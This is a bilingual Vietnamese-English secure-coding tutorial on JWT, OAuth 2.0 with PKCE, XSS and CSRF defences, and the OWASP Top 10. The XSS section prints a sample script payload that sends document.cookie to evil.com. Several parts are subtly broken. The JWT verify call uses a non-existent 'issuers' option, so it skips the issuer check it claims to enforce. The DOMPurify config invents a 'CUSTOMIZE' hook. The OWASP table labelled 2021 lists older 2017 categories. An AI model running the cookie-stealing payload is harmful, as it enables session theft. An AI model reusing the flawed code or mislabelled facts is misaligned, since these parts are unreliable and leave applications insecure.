# ⚙️ 5.4 Security Techniques (Kỹ Thuật Bảo Mật)

> **Security** là bảo vệ ứng dụng khỏi **tấn công, rò rỉ dữ liệu, truy cập trái phép**. "Security is not a feature, it's a mindset." — mọi dòng code đều có thể là vector tấn công nếu không được xử lý đúng cách.

```
Chi phí bảo mật vs chi phí sửa lỗi:
  Thiết kế bảo mật từ đầu  → $1 (secure by design)
  Sửa sau khi bị hack      → $1000+ + mất uy tín + regulatory fines
  Breach remediation trung bình: ~$4.4M (IBM Cost of a Data Breach Report 2025; đỉnh $4.88M năm 2024)
```

---

## 📚 Mục Lục

| # | Chủ đề | Mục Đích | Threat Category |
|---|--------|----------|-----------------|
| 5.4.1 | [JWT Authentication](../5.4.1-jwt-authentication/README.md) | Xác thực không trạng thái bằng JSON Web Token | Broken Authentication |
| 5.4.2 | [OAuth 2.0](../5.4.2-oauth-2.0/README.md) | Ủy quyền truy cập tài nguyên không cần password | Broken Authentication |
| 5.4.3 | [XSS Prevention](../5.4.3-xss-prevention/README.md) | Chống chèn mã độc qua input | Injection |
| 5.4.4 | [CSRF Protection](../5.4.4-csrf-protection/README.md) | Chống giả mạo request trái phép | Broken Authentication |
| 5.4.5 | [OWASP Top 10](../5.4.5-owasp-top-10/README.md) | Checklist top lỗ hổng bảo mật | All categories |

---

## 🔐 JWT Authentication (JSON Web Token)

**Threat model:** Attacker có mục tiêu forge token để access protected resource, hoặc intercept token để impersonate user.

```
┌─────────────────────────────────────────┐
│  JWT Structure:                         │
│  header.payload.signature               │
│  ├─ Base64(header)    → public info     │
│  │   { "alg": "HS256", "typ": "JWT" }  │
│  ├─ Base64(payload)   → claims (NOT secret)│
│  │   { "sub": "user123", "role": "admin" }│
│  └─ HMACSHA256(base64Header             │
│              + "." + base64Payload,    │
│              secret)                    │
│        ↑                                │
│   Secret KEY must NEVER be in client    │
└─────────────────────────────────────────┘
```

```typescript
import jwt from 'jsonwebtoken';
import { Request, Response, NextFunction } from 'express';

// Generate token — secret nằm trong environment variable, KHÔNG hardcode
function generateToken(user: { id: string; role: string }): string {
  return jwt.sign(
    { sub: user.id, role: user.role, iat: Math.floor(Date.now() / 1000) },
    process.env.JWT_SECRET!,           // 32+ chars, rotated periodically
    { expiresIn: '1h', issuer: 'myapp' } // short expiry + issuer claim
  );
}

// Verify token — check signature + expiration + issuer
function verifyToken(token: string): jwt.JwtPayload {
  return jwt.verify(token, process.env.JWT_SECRET!, {
    issuers: 'myapp',           // reject tokens from wrong issuer
    algorithms: ['HS256']       // reject algorithm switching attacks
  }) as jwt.JwtPayload;
}

// Middleware protect route
function authMiddleware(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;
  const token = authHeader?.startsWith('Bearer ')
    ? authHeader.slice(7)
    : null;

  if (!token) {
    return res.status(401).json({ error: 'Access denied: no token provided' });
  }

  try {
    const decoded = verifyToken(token);
    (req as any).user = decoded;
    next();
  } catch (err) {
    // Token expired, invalid signature, or wrong issuer
    return res.status(401).json({ error: 'Invalid or expired token' });
  }
}
```

**Attacker vectors & mitigations:**

| Attack | Description | Mitigation |
|--------|-------------|------------|
| **Token theft via XSS** | Attacker injects script to read `localStorage.token` | Store JWT in **HTTP-only cookie**, not localStorage |
| **Algorithm confusion** | Attacker changes alg to `none` or HS256→RS256 | Explicitly specify allowed algorithms in `verify()` |
| **Weak secret** | Brute force short/simple secret | Use 256-bit (32+ char) random secret; rotate periodically |
| **No expiration** | Stolen token valid forever | Always set `expiresIn`; implement token refresh flow |
| **No issuer validation** | Token from different service accepted | Set và validate `iss` (issuer) claim |

> ⚠️ **Lưu ý quan trọng:** Không lưu JWT trong `localStorage` — XSS script có đọc được. Prefer **HTTP-only cookie** với `SameSite=Strict` + `Secure` flag. Refresh token flow: access token ngắn hạn (15 phút), refresh token dài hạn (7 ngày) lưu trong HTTP-only cookie.

---

## 🔑 OAuth 2.0

**Threat model:** Attacker có mục tiêu intercept authorization code, forge redirect_uri, hoặc lạm dụng access token để access unauthorized resources.

```
OAuth 2.0 Flow (Authorization Code with PKCE):
  Client App          Authorization Server          Resource Server
       │                      │                          │
       │  1. Redirect to login │                          │
       │  (with code_challenge)│                          │
       │─────────────────────▶│                          │
       │                      │                          │
       │  2. User approves     │                          │
       │◀─────────────────────│                          │
       │                      │                          │
       │  3. Auth Code +       │                          │
       │     code_verifier     │                          │
       │◀─────────────────────│                          │
       │                      │                          │
       │  4. Exchange code for │                          │
       │     access token      │                          │
       │  (with code_verifier) │                          │
       │─────────────────────▶│                          │
       │                      │                          │
       │  5. Access Token      │                          │
       │◀─────────────────────│                          │
       │                      │                          │
       │  6. Request resource  │                          │
       │  (Bearer token)       │                          │
       │─────────────────────────────────────────────────▶│
       │                      │                          │
       │  7. Resource data     │                          │
       │◀─────────────────────────────────────────────────│
```

**PKCE (Proof Key for Code Exchange)** — bắt buộc cho public clients (SPA, mobile):
- Client tạo `code_verifier` (random string) và `code_challenge` (Base64URL(SHA256(verifier)))
-.authorization request gửi `code_challenge`
- Token exchange gửi `code_verifier` — auth server verify bằng SHA256
- Prevents authorization code interception attack

```typescript
// Basic OAuth 2.0 token exchange with PKCE
async function exchangeCodeForToken(
  code: string,
  codeVerifier: string,
  clientId: string,
  clientSecret: string
): Promise<OAuthToken> {
  const response = await fetch('https://auth.provider.com/oauth/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      grant_type: 'authorization_code',
      code,
      code_verifier: codeVerifier,     // PKCE: prevent code interception
      redirect_uri: 'http://localhost:3000/callback',  // must match auth request
      client_id: clientId,
      client_secret: clientSecret,
    }),
  });

  if (!response.ok) {
    throw new Error(`Token exchange failed: ${response.statusText}`);
  }

  return response.json();
}

// Token validation — check expiry, scope, issuer
interface OAuthToken {
  access_token: string;
  token_type: 'Bearer';
  expires_in: number;        // seconds until expiry
  scope: string;             // "read:users write:users"
  refresh_token?: string;
}
```

**Critical security practices:**
- ✅ Always use `HTTPS` — never send auth codes/tokens over HTTP
- ✅ Validate `state` parameter — prevents CSRF during auth flow
- ✅ Validate `redirect_uri` — prevent open redirect attacks
- ✅ Use PKCE for all public clients (SPAs, mobile apps)
- ✅ Short-lived access tokens + secure refresh token rotation
- ✅ Scope restriction — request only permissions you need

---

## 🛡️ XSS Prevention (Cross-Site Scripting)

**Threat model:** Attacker injects malicious script into webpage viewed by other users. Types: Stored XSS (persistent), Reflected XSS (one-time), DOM XSS (client-side only).

```
❌ VULNERABLE — rendering raw HTML from user input:
<div dangerouslySetInnerHTML={{ __html: userInput }} />
   → Attacker inputs: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
   → All users viewing this page have their cookies stolen

✅ PROTECTED — escape output (React does this automatically):
<div>{userInput}</div>
   → <script> tags rendered as plain text, not executed

✅ PROTECTED — sanitize HTML if rich text needed:
<div dangerouslySetInnerHTML={{ __html: sanitize(input) }} />
```

```typescript
// HTML Sanitization with DOMPurify
import DOMPurify from 'dompurify';

function sanitize(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title', 'target'],
    // Block javascript: URLs in href
    FORBID_ATTR: ['onmouseover', 'onerror', 'onclick'],
    // Custom config: only allow https: links
    CUSTOMIZE: {
      hooks: {
        sanitizeNode(node) {
          if (node.tagName === 'A') {
            const href = node.getAttribute('href');
            if (href?.startsWith('javascript:')) {
              node.removeAttribute('href');
            }
          }
        }
      }
    }
  });
}

// Content-Security-Policy (CSP) header — defense in depth
// Even if XSS succeeds, CSP blocks inline script execution
const csp = [
  "default-src 'self'",
  "script-src 'self' 'nonce-{random}' https://trusted.cdn.com",
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "img-src 'self' data: https://images.unsplash.com",
  "connect-src 'self' https://api.myapp.com",
  "frame-ancestors 'none'",           // prevent clickjacking
  "base-uri 'self'",
  "form-action 'self'"
].join('; ');

res.setHeader('Content-Security-Policy', csp);
res.setHeader('X-Content-Type-Options', 'nosniff');
res.setHeader('X-Frame-Options', 'DENY');
```

**XSS prevention checklist:**
- ✅ Output encoding/escaping (built-in in React, Vue, Angular)
- ✅ Input validation (Zod, Joi, class-validator)
- ✅ CSP headers (defense in depth)
- ✅ HTTP-only cookies for sensitive data (not localStorage)
- ✅ Sanitize rich text input (DOMPurify, not custom regex)
- ✅ Content-Type: application/json for APIs (prevent MIME sniffing)

---

## 🔄 CSRF Protection

**Threat model:** Attacker creates malicious webpage that causes logged-in victim's browser to make unwanted request to target site (using victim's cookies/session).

```
CSRF Attack Flow:
  Victim (logged in to bank.com)    Attacker Site (evil.com)
       │                                    │
       │   1. Victim visits                 │
       │      evil.com                      │
       │◀───────────────────────────────────│
       │                                    │
       │   2. Hidden form submits           │
       │      transfer request              │
       │  ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ▶│
       │      (browser sends bank.com       │
       │       cookies automatically)       │
       │                                    │
       ▼                                    │
  Bank processes transfer ❌ (victim       │
  didn't initiate this!)                   │
```

```typescript
// CSRF Token Approach — server generates unique token per session
import csurf from 'csurf';

const csrfProtection = csurf({
  cookie: {           // store token in HTTP-only cookie
    key: '_csrf',
    httpOnly: true,
    sameSite: 'strict'
  }
});

app.get('/transfer', csrfProtection, (req, res) => {
  // Token available via req.csrfToken()
  res.json({ csrfToken: req.csrfToken() });
});

app.post('/transfer', csrfProtection, (req, res) => {
  // csurf middleware verifies token matches session
  const { amount, to } = req.body;
  // process transfer...
  res.json({ success: true });
});

// SameSite Cookie attribute — modern browser-level CSRF protection
res.cookie('session', sessionId, {
  httpOnly: true,      // not accessible by JS (prevents XSS token theft)
  secure: true,        // only sent over HTTPS
  sameSite: 'strict',  // browser blocks cross-site cookie sending
  maxAge: 24 * 60 * 60 * 1000  // 24 hours
});

// Additional headers for defense in depth
res.setHeader('X-Content-Type-Options', 'nosniff');
res.setHeader('X-Frame-Options', 'DENY');  // prevent iframe embedding
```

**CSRF defense layers (combine multiple):**
1. **SameSite=Strict/Lax cookies** — browser prevents cross-site cookie sending
2. **CSRF tokens** — server validates unique token per request/session
3. **Custom headers** — require `X-Requested-With: XMLHttpRequest` or custom header
4. **Origin/Referrer checking** — verify request origin matches expected domain
5. **Double-submit cookie** — token in both cookie and request body/header

> ⚠️ SameSite=Lax is browser default for third-party cookies since 2024 — provides good CSRF protection for most cases. Combine with CSRF tokens for state-changing operations (POST/PUT/DELETE).

---

## 📋 OWASP Top 10 (2021) — 10 lỗ hổng quan trọng nhất

```
┌──────────────────────────────────────────────────────────────────┐
│  OWASP Top 10 — 10 lỗ hổng bảo mật phổ biến nhất                │
├──────┬──────────────────────┬───────────────────────────────────┤
│  #   │  Vulnerability        │  Primary Defense                │
├──────┼──────────────────────┼───────────────────────────────────┤
│  A01 │ Injection            │ Parameterized queries, output     │
│      │ (SQL, NoSQL, OS, LDAP) │ escaping, input validation        │
├──────┼──────────────────────┼───────────────────────────────────┤
│  A02 │ Authentication Fail.  │ MFA, rate limiting, secure        │
│      │                      │ password storage (bcrypt/argon2)  │
├──────┼──────────────────────┼───────────────────────────────────┤
│  A03 │ Sensitive Data Exposure│ Encryption at rest & in transit,│
│      │                      │ minimize data retention           │
├──────┼──────────────────────┼───────────────────────────────────┤
│  A04 │ XML External Entities│ Disable XXE in parsers,           │
│      │ (XXE)                │ use JSON instead of XML           │
├──────┼──────────────────────┼───────────────────────────────────┤
│  A05 │ Broken Access Control│ Deny by default, check perms on  │
│      │                      │ every request, ABAC/RBAC          │
├──────┼──────────────────────┼───────────────────────────────────┤
│  A06 │ Misconfiguration     │ Hardened defaults, IaC scans,    │
│      │                      │ least privilege, disable debug    │
├──────┼──────────────────────┼───────────────────────────────────┤
│  A07 │ XSS                  │ Output encoding, CSP, input      │
│      │                      │ validation, framework auto-escape │
├──────┼──────────────────────┼───────────────────────────────────┤
│  A08 │ Software/Data Integrity│ Signed commits, SLSA provenance,│
│      │                      │ dependency scanning, code signing │
├──────┼──────────────────────┼───────────────────────────────────┤
│  A09 │ Security Logging &    │ Structured logging, alert on      │
│      │ Monitoring Failures   │ brute force, SIEM integration     │
├──────┼──────────────────────┼───────────────────────────────────┤
│  A10 │ SSRF                 │ Input validation, allowlist       │
│      │                      │ URLs, block internal IP ranges    │
└──────┴──────────────────────┴───────────────────────────────────┘
```

---

## 🎯 Security Checklist — áp dụng cho mọi project

| Area | Checklist Item | Technique | Tool |
|------|---------------|-----------|------|
| **Passwords** | Hash before storing | bcrypt (12 rounds), argon2id | `bcrypt.hash(password, 12)` |
| **Input validation** | Validate ALL user input | Zod schema, Joi, class-validator | `z.string().email().min(3)` |
| **SQL injection** | Never string-concatenate queries | Parameterized queries, ORM | Prisma, TypeORM, knex |
| **XSS** | Escape output, sanitize input | Framework auto-escape, DOMPurify | React (auto-escape), DOMPurify |
| **CSRF** | Validate request origin | CSRF tokens, SameSite cookies | csurf, cookie options |
| **Auth** | Strong passwords, MFA, session management | bcrypt, JWT in HTTP-only cookie | passport.js, NextAuth |
| **Rate limiting** | Prevent brute force | Token bucket, sliding window | express-rate-limit |
| **HTTPS** | Encrypt in transit | TLS 1.3, HSTS | Let's Encrypt, nginx |
| **Secrets** | Never hardcode | Environment variables, secret managers | dotenv, AWS Secrets Manager |
| **Dependencies** | Scan for known vulns | SCA (Software Composition Analysis) | npm audit, Snyk, Dependabot |
| **Headers** | Security headers | Helmet, CORS config | helmet npm package |
| **CORS** | Restrict origins | Explicit allowlist, not wildcard | express cors with origin config |

---

## 🎯 Khi nào dùng?

| Scenario | Khuyến nghị | Lập luận |
|----------|-------------|----------|
| API cần xác thực user | ✅ JWT + HTTP-only cookie | Stateless auth with short expiry; cookie prevents XSS theft |
| Login bằng social (Google, GitHub) | ✅ OAuth 2.0 + PKCE | Delegated auth; app never sees user password |
| Form chấp nhận HTML input | ✅ XSS sanitization (DOMPurify) | Prevent stored XSS from rich text |
| State-changing endpoints (POST/PUT/DELETE) | ✅ CSRF protection | Prevent cross-site request forgery on sensitive operations |
| Xử lý dữ liệu nhạy cảm (PII, payment) | ✅ Encryption at rest + in transit | Compliance (GDPR, PCI-DSS) + breach mitigation |
| Public-facing app | ✅ OWASP Top 10 review | Systematic coverage of most critical vulnerabilities |
| Microservice inter-service auth | ✅ mTLS + short-lived JWT | Zero-trust; each service verifies identity |
| Mobile app auth | ✅ OAuth 2.0 + PKCE + biometric | Native app constraints require specialized flows |

> 💡 **Security is defense in depth:** No single technique is enough. Combine input validation + output escaping + CSP + HTTPS + rate limiting + monitoring. Each layer catches what the previous misses.

---

## 🔗 Liên quan

- **5.5 State Management** — Secure state handling (don't store tokens in global state)
- **5.10 API Design** — Secure API patterns (authentication, rate limiting, input validation)
- **5.1 Testing** — Security testing, penetration testing methodology
- **07 Testing** — Security test types: SAST, DAST, dependency scanning

---

## 📚 Tài liệu tham khảo

- 📖 [OWASP Top 10](https://owasp.org/www-project-top-ten/) — definitive vulnerability reference
- 📖 [JWT.io](https://jwt.io/introduction) — JWT specification and tools
- 📖 [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security) — comprehensive security guide
- 📖 [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) — per-topic security guides
- 📖 [OWASP ASVS (Application Security Verification Standard)](https://owasp.org/www-project-application-security-verification-standard/)
- 📖 [CSP Editor - Mozilla](https://csp.withgoogle.com/) — CSP policy builder and validator
- 📖 [Security.txt](https://securitytxt.org/) — standard for security disclosure contacts

---

## ▶️ Chạy ví dụ

```bash
cd 05-techniques-and-practices/5.4-security-techniques
npx tsx examples/index.ts
```

---

## ⏭️ Bài tiếp theo

→ [5.5 State Management](../5.5-state-management/README.md)
